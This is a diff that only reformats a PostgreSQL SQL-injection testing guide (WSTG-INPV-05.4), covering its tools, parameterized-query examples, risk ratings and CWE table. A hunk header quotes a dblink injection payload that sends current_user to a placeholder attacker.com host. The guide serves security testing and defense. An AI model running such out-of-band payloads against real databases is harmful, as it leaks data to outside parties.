@@ -1,9 +1,11 @@
 # WSTG-INPV-05.4: Testing for SQL Injection - PostgreSQL
 
 ## Test ID
+
 WSTG-INPV-05.4
 
 ## Test Name
+
 Testing for SQL Injection - PostgreSQL
 
 ## High-Level Description
@@ -320,12 +322,12 @@ SELECT * FROM dblink('host=attacker.com user=' || current_user || ' dbname=a', '
 
 ## Tools
 
-| Tool | Purpose |
-|------|---------|
-| SQLMap | Automated PostgreSQL SQLi |
-| psql | PostgreSQL client |
-| pgAdmin | GUI client |
-| Burp Suite | Manual testing |
+| Tool       | Purpose                   |
+| ---------- | ------------------------- |
+| SQLMap     | Automated PostgreSQL SQLi |
+| psql       | PostgreSQL client         |
+| pgAdmin    | GUI client                |
+| Burp Suite | Manual testing            |
 
 ---
 
@@ -341,28 +343,28 @@ cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
 
 ```javascript
 // Node.js - pg module
-const { Pool } = require('pg');
-const pool = new Pool();
+const { Pool } = require("pg")
+const pool = new Pool()
 
-pool.query('SELECT * FROM users WHERE id = $1', [userId]);
+pool.query("SELECT * FROM users WHERE id = $1", [userId])
 ```
 
 ---
 
 ## Risk Assessment
 
-| Finding | CVSS | Severity |
-|---------|------|----------|
-| PostgreSQL SQLi with superuser | 9.8 | Critical |
-| PostgreSQL file read | 8.6 | High |
-| PostgreSQL Blind SQLi | 8.6 | High |
+| Finding                        | CVSS | Severity |
+| ------------------------------ | ---- | -------- |
+| PostgreSQL SQLi with superuser | 9.8  | Critical |
+| PostgreSQL file read           | 8.6  | High     |
+| PostgreSQL Blind SQLi          | 8.6  | High     |
 
 ---
 
 ## CWE Categories
 
-| CWE ID | Title |
-|--------|-------|
+| CWE ID     | Title         |
+| ---------- | ------------- |
 | **CWE-89** | SQL Injection |
 
 ---
